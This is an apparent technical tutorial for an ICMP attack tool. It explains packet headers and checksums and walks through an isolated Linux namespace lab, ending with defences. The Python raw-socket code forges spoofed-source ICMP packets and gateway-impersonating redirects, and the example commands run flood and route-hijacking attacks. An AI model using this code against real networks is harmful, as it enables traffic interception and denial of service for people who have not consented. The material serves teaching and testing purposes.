# ICMP Attack Tool - Technical Deep Dive

## Table of Contents
1. [Packet Building Fundamentals](#packet-building-fundamentals)
2. [ICMP Protocol Theory](#icmp-protocol-theory)
3. [ICMP Redirect Attack Theory](#icmp-redirect-attack-theory)
4. [Network Namespace Setup](#network-namespace-setup)
5. [Raw Socket Implementation](#raw-socket-implementation)
6. [Attack Verification Methods](#attack-verification-methods)
7. [Practical Examples](#practical-examples)

---

## Packet Building Fundamentals

### Network Packet Structure

Every network packet consists of multiple layers, following the OSI model:

```
+------------------+
|   Application    |
|   (Payload)      |
+------------------+
|   Transport      |
|   (TCP/UDP)      |
+------------------+
|   Network        |
|   (IP Header)    |
+------------------+
|   Data Link      |
|   (Ethernet)     |
+------------------+
|   Physical       |
+------------------+
```

For ICMP attacks, we focus on:
- **IP Header** (Network Layer)
- **ICMP Header** (Network Layer Protocol)
- **Payload** (Optional data)

### IP Header Structure (20 bytes)

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|Version|  IHL  |Type of Service|          Total Length         |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|         Identification        |Flags|      Fragment Offset    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|  Time to Live |    Protocol   |         Header Checksum       |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                       Source Address                          |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Destination Address                        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

**Field Explanations:**
- **Version** (4 bits): IP version (4 for IPv4)
- **IHL** (4 bits): Internet Header Length (5 = 20 bytes)
- **Type of Service** (8 bits): QoS markings (usually 0)
- **Total Length** (16 bits): Total packet size
- **Identification** (16 bits): Unique packet identifier
- **Flags** (3 bits): Fragmentation control
- **Fragment Offset** (13 bits): Fragment position
- **TTL** (8 bits): Time to Live (hop limit)
- **Protocol** (8 bits): Next layer protocol (1 = ICMP)
- **Header Checksum** (16 bits): Error detection
- **Source/Dest Address** (32 bits each): IP addresses

### ICMP Header Structure

#### ICMP Echo Request/Reply Header (8 bytes)
```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|     Type      |     Code      |          Checksum             |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|           Identifier          |        Sequence Number        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Optional Payload Data...                   |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

**ICMP Echo Header Fields:**
- **Type** (8 bits): 8 = Echo Request, 0 = Echo Reply
- **Code** (8 bits): Always 0 for Echo Request/Reply
- **Checksum** (16 bits): Error detection for ICMP header + data
- **Identifier** (16 bits): Used to match requests with replies (often process ID)
- **Sequence** (16 bits): Packet sequence number for ordering/loss detection
- **Payload** (variable): Optional data (our code allows custom payload)

**Other Common ICMP Types:**
- **Type 3**: Destination Unreachable (Code varies: 0=Net, 1=Host, 3=Port)
- **Type 5**: Redirect Message (Code 1=Host redirect - used in our attacks)
- **Type 11**: Time Exceeded (Code 0=TTL, 1=Fragment reassembly)

#### ICMP Redirect Header (8 bytes + original packet)
```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|   Type (5)    |   Code (1)    |          Checksum             |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                     Gateway IP Address                        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|      Original IP Header + 8 bytes of original data...        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

### Code Implementation: IP Header Building

```python
def craft_ip_header(self, source_ip, dest_ip, payload_length):
    """Craft IP header using struct.pack()"""
    version = 4                    # IPv4
    header_length = 5              # 5 * 4 = 20 bytes
    tos = 0                        # Type of Service
    total_length = 20 + payload_length  # IP + payload
    identification = 54321         # Packet ID
    flags = 0                      # No fragmentation
    fragment_offset = 0            # Not fragmented
    ttl = 64                       # Time to live
    protocol = 1                   # ICMP protocol
    checksum = 0                   # Calculated later
    
    # Convert IP addresses to binary
    source = socket.inet_aton(source_ip)
    dest = socket.inet_aton(dest_ip)
    
    # Pack header fields into binary format
    header = struct.pack('!BBHHHBBH4s4s',
                       (version << 4) + header_length,  # Combine version + IHL
                       tos,
                       total_length,
                       identification,
                       (flags << 13) + fragment_offset, # Combine flags + offset
                       ttl,
                       protocol,
                       checksum,
                       source,
                       dest)
    
    # Calculate and insert checksum
    checksum = self.checksum(header)
    
    # Rebuild with correct checksum
    header = struct.pack('!BBHHHBBH4s4s',
                       (version << 4) + header_length,
                       tos, total_length, identification,
                       (flags << 13) + fragment_offset,
                       ttl, protocol, checksum,
                       source, dest)
    
    return header
```

### Code Implementation: ICMP Packet Building

```python
def craft_icmp_packet(self, icmp_type=8, icmp_code=0, identifier=12345, sequence=1, payload=b''):
    """Craft ICMP packet"""
    checksum = 0  # Will be calculated later
    
    # Pack ICMP header without checksum
    header = struct.pack('!BBHHH',
                       icmp_type,
                       icmp_code,
                       checksum,
                       identifier,
                       sequence)
    
    # Calculate checksum for header + payload
    checksum = self.checksum(header + payload)
    
    # Repack with correct checksum
    header = struct.pack('!BBHHH',
                       icmp_type,
                       icmp_code,
                       checksum,
                       identifier,
                       sequence)
    
    return header + payload
```

**ICMP Header Fields:**
- **Type** (8 bits): ICMP message type (8 = Echo Request, 0 = Echo Reply, 5 = Redirect)
- **Code** (8 bits): Subtype within message type (0 for most, 1 for host redirect)
- **Checksum** (16 bits): Error detection for ICMP header + data
- **Identifier** (16 bits): Used to match requests/replies (like process ID)
- **Sequence** (16 bits): Packet sequence number for ordering

### Checksum Calculation

The Internet checksum is crucial for packet integrity:

```python
def checksum(self, data):
    """Calculate Internet checksum"""
    # Make sure data is even length
    if len(data) % 2:
        data += b'\x00'
    
    # Sum all 16-bit words
    total = 0
    for i in range(0, len(data), 2):
        total += (data[i] << 8) + data[i + 1]
    
    # Add carry
    while total >> 16:
        total = (total & 0xFFFF) + (total >> 16)
    
    # One's complement
    return ~total & 0xFFFF
```

**Checksum Algorithm Steps:**
1. Pad data to even length if needed (add zero byte)
2. Sum all 16-bit words in network byte order
3. Add any carry bits back into sum (handle overflow)
4. Take one's complement of final result

**Why This Works:**
- Detects bit errors, byte swaps, and most transmission errors
- Simple to implement in hardware and software
- Self-checking: checksum of data+checksum should be 0xFFFF
- Used in IP, ICMP, TCP, and UDP protocols

---

## ICMP Protocol Theory

### What is ICMP?

**Internet Control Message Protocol (ICMP)** is a network layer protocol used for:
- Error reporting (destination unreachable, time exceeded)
- Network diagnostics (ping, traceroute)
- Network management (redirects, parameter problems)

### ICMP in Normal Operations

#### Echo Request/Reply (Ping)
```
Host A ──[ICMP Echo Request]──> Host B
Host A <──[ICMP Echo Reply]──── Host B
```

#### Route Discovery (Traceroute)
```
Host A ──[TTL=1]──> Router 1 ──[TTL Exceeded]──> Host A
Host A ──[TTL=2]──> Router 2 ──[TTL Exceeded]──> Host A
Host A ──[TTL=3]──> Destination ──[Echo Reply]──> Host A
```

### ICMP Message Types and Security Implications

| Type | Name | Security Risk |
|------|------|---------------|
| 3 | Destination Unreachable | DoS attacks |
| 5 | Redirect | Route manipulation |
| 8/0 | Echo Request/Reply | Network mapping |
| 11 | Time Exceeded | Information disclosure |

---

## ICMP Redirect Attack Theory

### Normal ICMP Redirect Behavior

ICMP redirects are **legitimate network optimization messages** sent by routers:

```
Scenario: Host needs better route to destination

   Host ────> Router A ────> Router B ────> Destination
     │           │
     │           └─[ICMP Redirect: "Use Router B directly"]
     │
     └───────> Router B ────> Destination
```

### When Redirects Occur

1. Host sends packet to Router A
2. Router A determines Router B is better next hop
3. Router A forwards original packet
4. Router A sends ICMP redirect to host
5. Host updates routing table
6. Future packets go directly to Router B

### ICMP Redirect Packet Structure

```
IP Header (Gateway → Victim)
┌─────────────────────────────────────┐
│ Source: Gateway IP                  │
│ Dest: Victim IP                     │
│ Protocol: ICMP (1)                  │
└─────────────────────────────────────┘

ICMP Redirect Header
┌─────────────────────────────────────┐
│ Type: 5 (Redirect)                  │
│ Code: 1 (Host Redirect)             │
│ Checksum: [calculated]              │
│ Gateway: New Gateway IP             │
└─────────────────────────────────────┘

Original Packet (IP Header + 8 bytes)
┌─────────────────────────────────────┐
│ Original IP Header (20 bytes)       │
│ First 8 bytes of original payload   │
└─────────────────────────────────────┘
```

### Attack Mechanics

#### Step 1: Craft Malicious Redirect
```python
def craft_icmp_redirect(self, gateway_ip, victim_ip, target_ip):
    """Craft ICMP redirect packet with embedded IP header"""
    # ICMP Type 5 (Redirect), Code 1 (Host redirect)
    icmp_type = 5
    icmp_code = 1
    checksum = 0
    gateway = socket.inet_aton(gateway_ip)
    
    # Create the original IP packet (victim -> target) that triggered the redirect
    inner_ip_header = self.craft_ip_header(victim_ip, target_ip, 8)  # IP + minimal ICMP
    inner_icmp = struct.pack('!BBHHH', 8, 0, 0, 12345, 1)  # Simple ICMP echo
    
    # ICMP redirect payload contains the original IP header + 8 bytes of data
    redirect_data = inner_ip_header + inner_icmp
    
    # ICMP redirect header
    icmp_header = struct.pack('!BBH4s',
                            icmp_type,
                            icmp_code,
                            checksum,
                            gateway)
    
    # Calculate checksum for ICMP header + data
    checksum = self.checksum(icmp_header + redirect_data)
    
    # Rebuild with correct checksum
    icmp_header = struct.pack('!BBH4s',
                            icmp_type,
                            icmp_code,
                            checksum,
                            gateway)
    
    return icmp_header + redirect_data
```

#### Step 2: Spoof Source Address
```python
# Create packet appearing to come from legitimate gateway
ip_header = self.craft_ip_header(
    gateway_ip,      # Spoof legitimate gateway
    victim_ip,       # Send to victim
    len(icmp_packet)
)
```

#### Step 3: Send Malicious Redirect
```python
# Send via raw socket
sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
packet = ip_header + icmp_packet
sock.sendto(packet, (victim_ip, 0))
```

### Attack Impact

**Successful ICMP redirect attacks can:**
1. **Route Hijacking**: Redirect traffic through attacker
2. **Man-in-the-Middle**: Intercept and modify traffic
3. **Denial of Service**: Route traffic to black hole
4. **Information Gathering**: Analyze redirected traffic

### Attack Flow Diagram

```
Normal Traffic Flow:
Victim ──> Gateway ──> Internet ──> Target

After ICMP Redirect Attack:
Victim ──> Attacker ──> [Intercept/Modify] ──> Target
    ↑
    └─[ICMP Redirect: "Use Attacker as gateway"]
```

---

## Network Namespace Setup

### What are Network Namespaces?

**Network namespaces** provide isolated network environments within a single Linux system:
- Separate network interfaces
- Independent routing tables  
- Isolated firewall rules
- Separate network statistics

### Benefits for Security Testing

1. **Isolation**: Attacks don't affect host system
2. **Simulation**: Create complex network topologies
3. **Safety**: Test destructive attacks safely
4. **Repeatability**: Consistent test environments

### Namespace Architecture

```
Host System
├── Default Namespace (Host network)
├── Victim Namespace (192.168.100.2)
│   ├── v-veth interface
│   ├── Independent routing table
│   └── Isolated network stack
└── Attacker Namespace (192.168.100.3)
    ├── s-veth interface  
    ├── Independent routing table
    └── Isolated network stack
```

### Step-by-Step Namespace Setup

#### 1. Create Namespaces
```bash
# Create two isolated network namespaces
sudo ip netns add victim
sudo ip netns add attacker

# Verify creation
sudo ip netns list
```

#### 2. Create Virtual Ethernet Pairs
```bash
# Create veth pair for victim namespace
sudo ip link add v-veth type veth peer name v-host

# Create veth pair for attacker namespace  
sudo ip link add s-veth type veth peer name s-host
```

**Veth Pairs Explained:**
- Always created in pairs (like ethernet cable)
- Traffic sent to one end appears on other end
- Connects namespaces to host or other namespaces

#### 3. Assign Interfaces to Namespaces
```bash
# Move one end of each pair into namespaces
sudo ip link set v-veth netns victim
sudo ip link set s-veth netns attacker

# Host keeps the other ends (v-host, s-host)
```

#### 4. Configure IP Addresses
```bash
# Configure victim namespace
sudo ip netns exec victim ip addr add 192.168.100.2/24 dev v-veth
sudo ip netns exec victim ip link set v-veth up
sudo ip netns exec victim ip link set lo up

# Configure attacker namespace
sudo ip netns exec attacker ip addr add 192.168.100.3/24 dev s-veth
sudo ip netns exec attacker ip link set s-veth up
sudo ip netns exec attacker ip link set lo up

# Configure host interfaces
sudo ip addr add 192.168.100.1/24 dev v-host
sudo ip addr add 192.168.100.1/24 dev s-host
sudo ip link set v-host up
sudo ip link set s-host up
```

#### 5. Create Bridge (Optional)
```bash
# Create bridge for inter-namespace communication
sudo ip link add br0 type bridge
sudo ip link set br0 up

# Add host interfaces to bridge
sudo ip link set v-host master br0
sudo ip link set s-host master br0

# Configure bridge IP
sudo ip addr add 192.168.100.1/24 dev br0
```

#### 6. Configure Routing
```bash
# Add default routes in namespaces
sudo ip netns exec victim ip route add default via 192.168.100.1
sudo ip netns exec attacker ip route add default via 192.168.100.1

# Enable IP forwarding on host
sudo sysctl net.ipv4.ip_forward=1
```

### Namespace Testing

```bash
# Test connectivity between namespaces
sudo ip netns exec victim ping -c 3 192.168.100.3
sudo ip netns exec attacker ping -c 3 192.168.100.2

# Test connectivity to test targets
sudo ip netns exec victim ping -c 3 203.0.113.1

# View namespace routing tables
sudo ip netns exec victim ip route show
sudo ip netns exec attacker ip route show
```

### Automated Setup Script

```bash
#!/bin/bash
# setup_lab.sh - Automated namespace lab setup

# Create namespaces
sudo ip netns add victim
sudo ip netns add attacker

# Create veth pairs
sudo ip link add v-veth type veth peer name v-host
sudo ip link add s-veth type veth peer name s-host

# Assign to namespaces
sudo ip link set v-veth netns victim
sudo ip link set s-veth netns attacker

# Configure victim namespace
sudo ip netns exec victim ip addr add 192.168.100.2/24 dev v-veth
sudo ip netns exec victim ip link set v-veth up
sudo ip netns exec victim ip link set lo up
sudo ip netns exec victim ip route add default via 192.168.100.1

# Configure attacker namespace
sudo ip netns exec attacker ip addr add 192.168.100.3/24 dev s-veth
sudo ip netns exec attacker ip link set s-veth up
sudo ip netns exec attacker ip link set lo up
sudo ip netns exec attacker ip route add default via 192.168.100.1

# Configure host
sudo ip addr add 192.168.100.1/24 dev v-host
sudo ip addr add 192.168.100.1/24 dev s-host
sudo ip link set v-host up
sudo ip link set s-host up

# Enable forwarding
sudo sysctl net.ipv4.ip_forward=1

echo "Lab setup complete!"
```

---

## Raw Socket Implementation

### Why Raw Sockets?

**Raw sockets** provide direct access to network protocols:
- **Control**: Manual packet construction with custom headers
- **Flexibility**: Custom packet fields and options not available in normal sockets
- **Performance**: Bypass kernel protocol stacks for speed
- **Education**: Deep understanding of packet structures and protocols
- **Security Testing**: Craft malformed or spoofed packets for testing

### Socket Creation and Configuration

```python
# Create raw ICMP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)

# Include IP header in packets (we'll craft our own)
sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

# Bind to specific interface (for namespace isolation)
if interface:
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, 
                   interface.encode())
```

### Packet Transmission

```python
def send_spoofed_packet(self, source_ip, dest_ip, icmp_type=8, icmp_code=0, payload=b'', interface=None):
    """Send spoofed ICMP packet using raw socket"""
    try:
        # Create raw socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        # Bind to specific interface if in namespace
        if interface:
            try:
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, interface.encode())
            except:
                pass  # Continue without binding if it fails
        
        # Craft packets
        icmp_packet = self.craft_icmp_packet(icmp_type, icmp_code, payload=payload)
        ip_header = self.craft_ip_header(source_ip, dest_ip, len(icmp_packet))
        
        # Complete packet = IP header + ICMP packet
        packet = ip_header + icmp_packet
        
        # Send packet (port ignored for raw sockets)
        sock.sendto(packet, (dest_ip, 0))
        sock.close()
        
        return True
        
    except PermissionError:
        print("Error: Root privileges required for raw sockets")
        return False
    except Exception as e:
        print(f"Error sending packet: {e}")
        return False
```

**Key Points:**
- `SOCK_RAW` creates a raw socket bypassing normal IP stack
- `IP_HDRINCL` tells kernel we're providing our own IP header
- `SO_BINDTODEVICE` binds to specific interface (important for namespaces)
- Complete packet is IP header + ICMP header + payload
- Port number is ignored for raw sockets (set to 0)

### Struct.pack() Format Strings

**IP Header Format: `'!BBHHHBBH4s4s'`**
```python
struct.pack('!BBHHHBBH4s4s',
    (version << 4) + header_length,  # B: Version(4) + IHL(4) = 1 byte
    tos,                             # B: Type of Service = 1 byte  
    total_length,                    # H: Total Length = 2 bytes
    identification,                  # H: ID = 2 bytes
    (flags << 13) + fragment_offset, # H: Flags(3) + Fragment(13) = 2 bytes
    ttl,                             # B: Time to Live = 1 byte
    protocol,                        # B: Protocol = 1 byte
    checksum,                        # H: Checksum = 2 bytes
    source,                          # 4s: Source IP = 4 bytes
    dest)                            # 4s: Dest IP = 4 bytes
# Total: 20 bytes (standard IP header)
```

**ICMP Header Format: `'!BBHHH'`**
```python
struct.pack('!BBHHH',
    icmp_type,      # B: ICMP Type = 1 byte
    icmp_code,      # B: ICMP Code = 1 byte  
    checksum,       # H: Checksum = 2 bytes
    identifier,     # H: Identifier = 2 bytes
    sequence)       # H: Sequence = 2 bytes
# Total: 8 bytes (standard ICMP header)
```

**ICMP Redirect Format: `'!BBH4s'`**
```python
struct.pack('!BBH4s',
    icmp_type,      # B: Type (5) = 1 byte
    icmp_code,      # B: Code (1) = 1 byte
    checksum,       # H: Checksum = 2 bytes
    gateway)        # 4s: Gateway IP = 4 bytes
# Total: 8 bytes + original packet data
```

**Format Character Reference:**
```
! = Network byte order (big-endian, required for network protocols)
B = Unsigned char (1 byte, 0-255)
H = Unsigned short (2 bytes, 0-65535)
4s = 4-byte string (perfect for IPv4 addresses)
x = pad byte (for alignment)
```

**Byte Order Importance:**
- Network protocols use **big-endian** byte order (most significant byte first)
- Intel x86 systems use **little-endian** (least significant byte first)  
- The `!` prefix converts to network byte order automatically
- Without `!`, multi-byte fields would be transmitted backwards

### Interface Detection in Namespaces

```python
def get_namespace_interface(self):
    """Auto-detect interface within namespace"""
    if not self.namespace:
        return None
    
    try:
        # Execute command within namespace
        cmd = ['ip', 'netns', 'exec', self.namespace, 
               'ip', 'link', 'show']
        result = subprocess.run(cmd, capture_output=True, 
                              text=True, timeout=5)
        
        if result.returncode == 0:
            lines = result.stdout.split('\n')
            for line in lines:
                # Look for veth interfaces that are UP
                if 'veth' in line and 'UP' in line and '@' in line:
                    # Extract: "2: v-veth@if26:" -> "v-veth"
                    interface = line.split(':')[1].strip().split('@')[0]
                    return interface
        return None
    except Exception:
        return None
```

---

## Attack Verification Methods

### 1. Routing Table Monitoring

```bash
# Continuous monitoring of victim's routing table
sudo ip netns exec victim watch -n 1 'ip route get 203.0.113.1'

# Before attack:
203.0.113.1 via 192.168.100.1 dev v-veth src 192.168.100.2

# After successful attack:
203.0.113.1 via 192.168.100.3 dev v-veth src 192.168.100.2
```

### 2. Automated Route Change Detection

```python
def monitor_routing_changes(self, victim_ip, target_ip, namespace=None):
    """Monitor for routing table changes"""
    # Capture initial route
    initial_route = self.get_current_route(target_ip, namespace)
    
    while self.monitoring:
        current_route = self.get_current_route(target_ip, namespace)
        
        if current_route != initial_route:
            print(f"ROUTE CHANGE DETECTED!")
            print(f"Old: {initial_route}")
            print(f"New: {current_route}")
            self.attack_stats['routing_changes'] += 1
            initial_route = current_route
        
        time.sleep(2)

def get_current_route(self, target_ip, namespace=None):
    """Get current route to target"""
    if namespace:
        cmd = ['ip', 'netns', 'exec', namespace, 
               'ip', 'route', 'get', target_ip]
    else:
        cmd = ['ip', 'route', 'get', target_ip]
    
    result = subprocess.run(cmd, capture_output=True, text=True)
    return result.stdout.strip() if result.returncode == 0 else ""
```

### 3. Traffic Analysis

```bash
# Capture ICMP traffic on attacker interface
sudo ip netns exec attacker tcpdump -i s-veth icmp -nn -v

# Monitor all traffic from victim
sudo ip netns exec victim tcpdump -i v-veth -nn

# Watch for redirected traffic arriving at attacker
sudo tcpdump -i any host 192.168.100.3 and not icmp
```

### 4. Network Connectivity Testing

```bash
# Test victim connectivity before/after attack
sudo ip netns exec victim ping -c 3 203.0.113.1
sudo ip netns exec victim traceroute 203.0.113.1

# Verify attacker receives redirected traffic
sudo ip netns exec attacker netstat -i
sudo ip netns exec attacker ss -tuln
```

---

## Practical Examples

### Example 1: Basic ICMP Spoofing

```bash
# Goal: Send spoofed ping from fake source to victim
sudo python3 icmp_spoofer_raw.py 192.168.100.2 \
    --source 10.0.0.1 \
    --namespace attacker \
    --type 8

# Expected Result:
# - Victim receives ping from 10.0.0.1
# - Victim attempts to reply to 10.0.0.1 (unreachable)
# - Demonstrates IP spoofing capability
```

### Example 2: ICMP Flood Attack

```bash
# Goal: Overwhelm victim with spoofed ICMP packets
sudo python3 icmp_spoofer_raw.py 192.168.100.2 \
    --flood \
    --duration 30 \
    --delay 0.001 \
    --namespace attacker

# Expected Result:
# - High packet rate to victim
# - Random source IPs for each packet
# - Victim resources consumed processing packets
```

### Example 3: ICMP Redirect Attack

```bash
# Goal: Redirect victim's traffic to test server through attacker
sudo python3 icmp_redirect_raw.py \
    192.168.100.2 \
    203.0.113.1 \
    192.168.100.1 \
    --fake-gateway 192.168.100.3 \
    --namespace attacker \
    --monitor-namespace victim \
    --continuous

# Expected Result:
# - Victim's route to 203.0.113.1 changes to use 192.168.100.3
# - Future traffic to 203.0.113.1 goes through attacker namespace
# - Attacker can intercept/modify traffic
```

### Example 4: Complete Attack Verification

```bash
# Terminal 1: Start route monitoring
sudo ip netns exec victim watch -n 1 'ip route get 8.8.8.8'

# Terminal 2: Capture traffic on attacker interface
sudo ip netns exec attacker tcpdump -i s-veth -nn -v

# Terminal 3: Execute attack
sudo python3 icmp_redirect_raw.py 192.168.100.2 203.0.113.1 192.168.100.1 \
    --fake-gateway 192.168.100.3 \
    --namespace attacker \
    --monitor-namespace victim \
    --continuous

# Terminal 4: Test victim connectivity
sudo ip netns exec victim ping 203.0.113.1
sudo ip netns exec victim traceroute 203.0.113.1

# Terminal 5: Monitor victim interface for redirected traffic
sudo ip netns exec victim tcpdump -i v-veth -nn
```

**What to Observe:**
1. **Terminal 1**: Route changes from `via 192.168.100.1` to `via 192.168.100.3`
2. **Terminal 2**: ICMP redirect packets being sent from attacker
3. **Terminal 3**: Script shows "routing changes detected"
4. **Terminal 4**: Ping/traceroute now goes through 192.168.100.3
5. **Terminal 5**: Traffic destined for 203.0.113.1 appears on victim interface

### Attack Success Indicators

1. **Route Table Changes**: `ip route get` shows new gateway
2. **Traffic Redirection**: tcpdump shows traffic via attacker
3. **Response Time Changes**: Ping times may increase
4. **Traceroute Changes**: Different path to destination

### Common Issues and Troubleshooting

#### Raw Socket Permission Errors
```bash
# Error: Operation not permitted
# Solution: Run with sudo
sudo python3 script.py

# Or set capabilities
sudo setcap cap_net_raw+ep /usr/bin/python3
```

#### Namespace Connectivity Issues
```bash
# Check namespace exists
sudo ip netns list

# Verify interface is up
sudo ip netns exec victim ip link show

# Test basic connectivity
sudo ip netns exec victim ping 192.168.100.1
```

#### Routing Table Not Updating
```bash
# Check ICMP redirect acceptance
sudo ip netns exec victim sysctl net.ipv4.conf.all.accept_redirects
sudo ip netns exec victim sysctl net.ipv4.conf.v-veth.accept_redirects

# Enable if disabled (required for attack to work)
sudo ip netns exec victim sysctl -w net.ipv4.conf.all.accept_redirects=1
sudo ip netns exec victim sysctl -w net.ipv4.conf.v-veth.accept_redirects=1

# Check kernel route cache (may need flushing)
sudo ip netns exec victim ip route flush cache
```

#### Packet Building Verification
```bash
# Verify packet structure with tcpdump
sudo tcpdump -i any -XX icmp

# Check for malformed packets
sudo tcpdump -i any -v icmp and host 192.168.100.2

# Verify checksums are correct
sudo tcpdump -i any -vv icmp
```

---

## Security Implications and Defenses

### Attack Limitations

1. **Same Subnet Required**: ICMP redirects only work on local network
2. **Redirect Acceptance**: Target must accept ICMP redirects
3. **Route Priority**: Existing routes may override redirects
4. **Temporary Effect**: Routes may timeout or be refreshed

### Defense Mechanisms

1. **Disable ICMP Redirects**:
   ```bash
   sysctl -w net.ipv4.conf.all.accept_redirects=0
   sysctl -w net.ipv4.conf.all.send_redirects=0
   ```

2. **Static Routing**: Use static routes instead of dynamic
3. **Network Monitoring**: Monitor for unusual ICMP traffic
4. **Firewalls**: Block unnecessary ICMP types
5. **Network Segmentation**: Limit attack scope

### Educational Value

This tool demonstrates:
- **Low-level networking**: Manual packet construction
- **Protocol vulnerabilities**: ICMP redirect weaknesses  
- **Network isolation**: Namespace security benefits
- **Attack detection**: Monitoring and verification methods

Use responsibly and only on networks you own or have explicit permission to test.